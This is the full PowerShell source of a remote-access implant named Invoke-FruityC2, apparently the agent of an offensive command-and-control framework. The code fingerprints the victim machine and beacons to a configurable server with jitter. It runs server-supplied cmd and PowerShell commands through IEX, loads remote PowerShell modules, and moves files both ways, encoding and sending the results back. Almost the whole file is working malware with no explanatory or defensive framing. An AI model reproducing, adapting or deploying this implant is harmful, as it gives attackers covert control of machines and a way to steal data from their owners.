function Invoke-FruityC2 {
    param(
        [String]$r_server = "",
        [String]$r_port = "",
        [String]$r_ssl = "",
        [String]$path_get = "",
        [String]$path_post = "",
        [Int]$stime = 10,
        [Int]$jitter = 0,
        [String]$UA = "",
        [Bool]$stager = $true,
        [String]$target = ""
    )

    clear

    [Int]$script:stime = $stime
    [Int]$script:jitter = $jitter
    [String]$script:UA = $UA
    [String]$script:path_get = $path_get
    [String]$script:path_post = $path_post
    [String]$script:target = $target

    # DEBUG
    Write-Host "[DEFAULT]"
    Write-Host "-------"
    Write-Host "stime: $script:stime"
    Write-Host "jitter: $script:jitter"
    Write-Host "UA: $script:UA"
    Write-Host "GET: $script:path_get"
    Write-Host "POST: $script:path_post"
    Write-Host "target: $script:target"
    Write-Host "-------"

    # http://waynes-world-it.blogspot.co.uk/2008/05/reading-web-content-with-powershell.html

    [String]$UUID = ""
    [String]$KEY = "SECRET"
    [bool]$option_base64 = $false
    [bool]$option_encryption = $false
    [bool]$option_compression = $true

    [Bool]$autoexit = $false

    $r_server = $r_server
    $r_port = $r_port

    function b64encoder($output) {
        $b = [System.Text.Encoding]::UTF8.GetBytes($output)
        $output = [System.Convert]::ToBase64String($b)
        $output = $output.replace("+","-") # BASE64 URLSAFE
        $output = $output.replace("/","_") # BASE64 URLSAFE
        return $output
    }

    function b64decoder($data) {
        $data = $data.replace("-","+") # BASE64 URLSAFE
        $data = $data.replace("_","/") # BASE64 URLSAFE
        $data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
        return $data
    }

    function getUUID() {
        $string = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' | Select-Object -ExpandProperty MachineGuid) | Out-String
        $string = $string.Trim()
        $string = [int][double]::Parse((Get-Date -UFormat %s))
        return $string
    }

    function getUser() {
        $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
        $string = $string.Trim()
        return $string
    }

    function getMandatoryLabel() {
        if(([Environment]::UserName).ToLower() -eq "system"){$string='4'}
        elseif(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $true){$string='3'} # 3=High
        else {$string='2'}
        return $string
    }

    function getComputerName() {
        $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
        $string = $string.Trim()
        return $string
    }

    function getComputerIP() {
        $string = (Test-Connection $env:COMPUTERNAME -count 1 | select Ipv4Address) | FT -HideTableHeaders |  Out-String
        $string = $string.Trim()
        return $string
    }

    function getVersion() {
        $string = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] | Out-String
        $string = $string.Trim()
        return $string
    }

    function getOSArchitecture() {
        $string = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
        $string = $string.Trim()
        return $string
    }

    Function encrypt([string]$str) {
        # NOTE: You need to implement your own encryption/decryption method. (FUNCTION: encrypt and decrypt)

        return $str
    }

    Function decrypt([string]$str) {
        # NOTE: You need to implement your own encryption/decryption method. (FUNCTION: encrypt and decrypt)

        return $str
    }

    function deflate($data) { # COMPRESS DATA
        # REF: https://gist.github.com/strazzere/5faa709a3db9e1dcf3b5
        # REF: http://chernodv.blogspot.co.uk/2014/12/powershell-compression-decompression.html
        $s = $data
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $sw = New-Object System.IO.StreamWriter($cs)
        $sw.Write($s)
    
        $sw.Close();
        $s = [System.Convert]::ToBase64String($ms.ToArray())
        $s = $s.replace("+","-") # BASE64 URLSAFE
        $s = $s.replace("/","_") # BASE64 URLSAFE
        return $s
    }

    function inflate($data) { # DECOMPRESS DATA
        $data = $data.replace("-","+") # BASE64 URLSAFE
        $data = $data.replace("_","/") # BASE64 URLSAFE
        $data = [System.Convert]::FromBase64String($data)

        $ms = New-Object System.IO.MemoryStream
        $ms.Write($data, 0, $data.Length)
        $ms.Seek(0,0) | Out-Null
        $sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
        return $sr.ReadToEnd()
    }

    Function rx_data($data) {
        #if ($option_base64 -eq $true) { $data = b64decoder($data) }
        if ($option_compression -eq $true) { $data = inflate($data) }
        if ($option_encryption -eq $true) { $data = decrypt($data) }
        return $data
    }

    Function tx_data($data) {
        if ($option_encryption -eq $true) { $data = encrypt($data) }
        if ($option_compression -eq $true) { $data = deflate($data) }
        #if ($option_base64 -eq $true) { $data = b64encoder($data) }
        return $data
    }

    if ($script:target -eq "") {

        $VERSION = getVersion
        $USER = getUser
        $LABEL = getMandatoryLabel
        $NAME = getComputerName
        $IP = getComputerIP
        $UUID = getUUID
        
        # DEBUG
        Write-Host "[DEBUG]"
        Write-Host "-------"
        $VERSION
        $USER
        $LABEL
        $NAME
        $IP
        $UUID
        Write-Host "-------"

        $TARGET = tx_data("$UUID|$VERSION|$USER|$LABEL|$NAME|$IP")
    } else {
        $TARGET = $script:target
    }

    function Get-Data {
        param($path = $script:path_get)
        try{
            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $wc.Headers.Add("Cookie", "SESSIONID=$TARGET;")

            $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"

            #Write-Host "GET-DATA: $request"

            #$data = $wc.DownloadString("http://"+$r_server+"/load")
            $data = $wc.DownloadString($request)
            return $data
        }
        catch [Net.WebException] {
            Write-Host "Get-Data ERROR."
        }
    }

    function Send-Data {
        param(
            $param, 
            $path = $script:path_post
            )
        try{
            $wc = new-object system.net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent",$UA)
            $wc.Headers.Add("Cookie", "SESSIONID=$TARGET;")

            $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"

            Write-Host $request

            $enc = [system.Text.Encoding]::UTF8
            $send = $enc.GetBytes($param)
            $data = $wc.UploadData($request, "POST", $send);
            #$data = $wc.UploadString("http://"+$r_server+"/send", "POST", $send);
        }
        catch [System.Net.WebException]{
            Write-Host "Send-Data ERROR."
        }
    }

    function stager() {
        $path_stager = -join ((65..90) + (97..122) | Get-Random -Count 30 | % {[char]$_})

        $data = Get-Data -path "/$path_stager"

        #Write-Host "STAGER: $data"

        [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
    
        [Array[]]$temp = $data.split("|")

        $script:stime = [convert]::ToInt32($temp[0],10)
        $script:jitter = [convert]::ToInt32($temp[1],10)
        $script:UA = $temp[2]
        $script:path_get = $temp[3]
        $script:path_post = $temp[4]
    
    }

    function execShellCommand ($command) {
        try {
            $string = IEX("cmd /c $command") | Out-String
            return $string
        }
        catch {
            return "[COMMAND ERROR] : $command"
        }
    }

    function execPowershellCommand ($command) {
        try {
            $string = IEX("$command") | Out-String
            return $string
        }
        catch {
            return "[COMMAND ERROR] : $command"
        }
    }

    function getBeaconTime() {
        $stime = $script:stime
        $jitter = $script:jitter

        if ($jitter -gt 0) {
            $value = ($stime*$jitter)/100
            $sleepTime = Get-Random -minimum ($stime-$value) -maximum ($stime+$value+1);

            #return [convert]::ToInt32($sleepTime)
            return $sleepTime
        } else {
            return $stime
        }
    }

    # DEBUG
    if ($stager -eq $true) { stager }
    Write-Host "[PROFILE]"
    Write-Host "-------"
    Write-Host "stime: $script:stime"
    Write-Host "jitter: $script:jitter"
    Write-Host "UA: $script:UA"
    Write-Host "GET: $script:path_get"
    Write-Host "POST: $script:path_post"
    Write-Host "-------"

    $timeout = new-timespan -Minutes 10
    $sw = [diagnostics.stopwatch]::StartNew()

    [Int]$flag = 0
    #$beacon_sleep = 5

    # INFINITE LOOP IF AUTOEXIT IS FALSE
    $timetorun = $true

    while ($timetorun){
    
        # IF AUTOEXIT IS TRUE, IT WILL EXIT AFTER TIMEOUT
        if ($autoexit -eq $true) {
            if ($sw.elapsed -gt $timeout) {
                #ORGINAL: $sw.elapsed -lt $timeout
                $timetorun = $false
            }
        }

        try
        {
            #[String]$data = $WebClient.DownloadString($WebObject)
            [String]$data = Get-Data

            [String]$data = rx_data($data) # DECODE/DECRYPT RECEIVED DATA
        
            [Array[]]$temp = $data.split("|")
            [String]$exec_command = $temp[0]
            [Int]$exec_flag = [convert]::ToInt32($temp[1], 10)
            $exec_data = ""
            try {
                [String]$exec_data = $temp[2]
            } catch {
                $exec_data = ""    
            }

            if ($flag -lt $exec_flag)
            {
                # RESET TIMEOUT
                $sw = [diagnostics.stopwatch]::StartNew()

                $flag = "$exec_flag"

                if ($data -eq "EXIT"){
                    write-host "Connection Closed..."
                    return
                }

                # CHANGE BECON SLEEP TIME
                ElseIf ($exec_command.StartsWith("sleep")){
                        [Array[]]$temp = $exec_command.split(" ")
                        [String]$exec_command = $temp[0]
                        [Int]$beacon_sleep = [convert]::ToInt32($temp[1], 10)
                        echo $beacon_sleep
                        $script:stime = $beacon_sleep
                        echo $script:stime
                        #return
                }

                # DOWNLOAD A FILE FROM C2
                ElseIf ($exec_command.StartsWith("upload")){
                        $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                        $upload_name = $exec_command.split(" ")[1]

                        $path = pwd

                        [Byte[]] $temp = $exec_data -split ' ' ; 
                        [System.IO.File]::WriteAllBytes("$path\$upload_name", $temp)

                        $output = execPowershellCommand("ls $path\$upload_name")
                    
                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"

                        echo  "upload done..." # DEBUG
                }

                # UPLOAD A FILE TO C2
                ElseIf ($exec_command.StartsWith("download")){
                        $exec_command
                        $upload_file = $exec_command.split(" ")[1]

                        $path = pwd

                        $bytes = [System.IO.File]::ReadAllBytes("$path\$upload_file")

                        $output = ""
                        foreach ($byte in $bytes) {
                            $output += [String]::Format("{0:D}",$byte) + " "
                        }

                        $output = $output.Trim()
                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"

                        echo  "download done..." # DEBUG
                }

                # IMPORT POWERSHELL MODULE
                ElseIf ($exec_command -eq "powershell-import"){
                        $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                        IEX $exec_data

                        echo "powershell-import..."
                }

                # EXEC POWERSHELL COMMAND
                ElseIf ($exec_command.StartsWith("powershell ")){
                        $exec_command = $exec_command -replace "^powershell ",""
                        $output = execPowershellCommand($exec_command)
                    
                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                }

                # DOWNLOAD AND EXEC POWERSHELL SCRIPT
                ElseIf ($exec_command -eq "powershell-runscript"){
                        $exec_command = $exec_command.Replace("powershell-runscript", "")
                        $exec_data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($exec_data))
                        $output = execPowershellCommand($exec_data)

                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                }

                ElseIf ($exec_command.StartsWith("powershell-encoded ")){
                        $exec_command = $exec_command.Replace("powershell-encoded ", "powershell ")
                        $exec_command
                        <#
                        $output = execPowershellCommand($exec_command)
                        echo $output
                        $output = b64encoder($output)
                        $URL = "http$($SSL)://$($Rserver):$($Rport)/send"
                        Invoke-submitPostForm -url $URL -param "send=$output"
                        #>
                }

                # PRINT CURRENT DIRECTORY
                ElseIf ($exec_command -eq ("pwd")){
                        $output = execPowershellCommand("pwd")
                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                }

                # LIST FILES
                ElseIf ($exec_command -eq ("ls")){
                        $output = execPowershellCommand("ls")
                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                }

                # CHANGE CURRENT PATH
                ElseIf ($exec_command.StartsWith("cd ")){
                        $output = execPowershellCommand($exec_command)
                        $output = execPowershellCommand("pwd")

                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                }

                # EXEC CMD COMMAND
                ElseIf ($exec_command.StartsWith("shell ")){
                        $exec_command = $exec_command -replace "^shell ",""
                        $output = execShellCommand($exec_command)

                        echo $output # DEBUG

                        $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                        Send-Data -param "send=$output"
                }

                # EXIT 
                ElseIf ($exec_command -eq ("exit")){
                    echo "EXIT..."
                    break
                }

                ElseIf ($exec_command -eq ("checkin")){
                    echo "I'm alive ;)" # DEBUG
                    $output = "ok"

                    $output = tx_data($output) # ENCRYPT/ENCODE DATA TO TRANSFER
                    Send-Data -param "send=$output"
                }

                Else {
                    echo "exec command..."
                }
            }
            #echo $data
            #execCommand($data)
        } 
        catch 
        {
            #echo "[BOT ERROR] $Error[0]"
            #Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
            echo "[BOT ERROR]"
        }
        $sleepTime = getBeaconTime # GET SLEEP TIME AND JITTER
        start-sleep -seconds $sleepTime
    }
    echo "Bye Bye PS-BOT ;)"
}
#Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx"
